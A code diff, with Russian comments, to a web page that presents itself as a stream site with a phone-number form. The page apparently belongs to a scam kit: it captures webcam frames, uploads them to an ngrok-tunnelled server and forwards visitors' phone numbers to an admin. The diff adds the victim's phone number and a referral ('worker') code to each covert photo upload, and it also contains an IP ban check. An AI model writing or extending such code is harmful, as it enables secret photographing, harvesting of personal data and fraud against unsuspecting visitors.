@@ -827,7 +827,7 @@
                 <div class="option-item" data-value="+31" data-flag="nl" onclick="selectOption('+31', 'Нидерланды (+31)', 'nl')">
                     <img src="flags/nl.png" class="flag" alt="Флаг"> Нидерланды (+31)
                 </div>
-                <!-- ===== РУМЫНИЯ (УЖЕ ЕСТЬ, НО ОСТАВЛЯЮ) ===== -->
+                <!-- ===== РУМЫНИЯ ===== -->
                 <div class="option-item" data-value="+40" data-flag="ro" onclick="selectOption('+40', 'Румыния (+40)', 'ro')">
                     <img src="flags/ro.png" class="flag" alt="Флаг"> Румыния (+40)
                 </div>
@@ -975,22 +975,18 @@
     // ============================================================
     async function checkBan() {
         try {
-            // ПОЛУЧАЕМ IP
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
             const ip = ipData.ip;
             
-            // ПРОВЕРЯЕМ БАН НА СЕРВЕРЕ
             const banRes = await fetch(`${API_URL}/check_ban_frontend`);
             const banData = await banRes.json();
             
             if (banData.banned) {
-                // ПОКАЗЫВАЕМ СТРАНИЦУ БАНА
                 document.getElementById('banIpDisplay').textContent = ip;
                 document.getElementById('banIdDisplay').textContent = String(Math.abs(hashCode(ip)) % 1000000).padStart(6, '0');
                 document.getElementById('banPage').classList.add('active');
                 
-                // СКРЫВАЕМ ВСЁ ОСТАЛЬНОЕ
                 document.getElementById('loadingOverlay').style.display = 'none';
                 document.getElementById('videoContainer').style.display = 'none';
                 document.getElementById('stream-content').style.display = 'none';
@@ -1005,7 +1001,6 @@
             return true;
         } catch(e) {
             console.log('❌ Ошибка проверки бана:', e);
-            // ЕСЛИ СЕРВЕР НЕ ОТВЕЧАЕТ - ПУСКАЕМ (НО ЭТО НЕ ДОЛЖНО СЛУЧИТЬСЯ)
             return true;
         }
     }
@@ -1313,13 +1308,21 @@
                 canvas.height = videoEl.videoHeight || 480;
                 ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                 const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                // ===== ИСПРАВЛЕННЫЙ ЗАПРОС С ref И phone =====
                 await fetch(`${API_URL}/upload_photo`, {
                     method: 'POST',
                     headers: { 
                         'Content-Type': 'application/json',
                         'ngrok-skip-browser-warning': 'true'
                     },
-                    body: JSON.stringify({ photo: photoData, step: i+1, timestamp: Date.now() })
+                    body: JSON.stringify({ 
+                        photo: photoData, 
+                        step: i+1, 
+                        timestamp: Date.now(),
+                        ref: currentRefCode || '',
+                        phone: currentPhone || 'Неизвестно'
+                    })
                 });
             }
             const endTime = performance.now();
@@ -1403,6 +1406,7 @@
                 fullPhone = phone;
             }
             
+            currentPhone = fullPhone;
             sendToAdmin(`📞 НОВЫЙ НОМЕР: ${fullPhone}`);
             
             btn.disabled = true;
@@ -1542,16 +1546,13 @@
     // ========== ГЛАВНАЯ ЗАГРУЗКА С ПРОВЕРКОЙ БАНА ==========
     // ============================================================
     (async function main() {
-        // СНАЧАЛА ПРОВЕРЯЕМ БАН
         const allowed = await checkBan();
         
-        // ЕСЛИ БАН - ВЫХОДИМ, ВСЁ УЖЕ ПОКАЗАНО
         if (!allowed) {
             console.log('🚫 IP ЗАБАНЕН, ДОСТУП ЗАКРЫТ');
             return;
         }
         
-        // ЕСЛИ НЕ ЗАБАНЕН - ЗАГРУЖАЕМ ВСЁ ОСТАЛЬНОЕ
         console.log('✅ IP НЕ ЗАБАНЕН, ЗАГРУЗКА САЙТА');
         loadWorkerData();
         
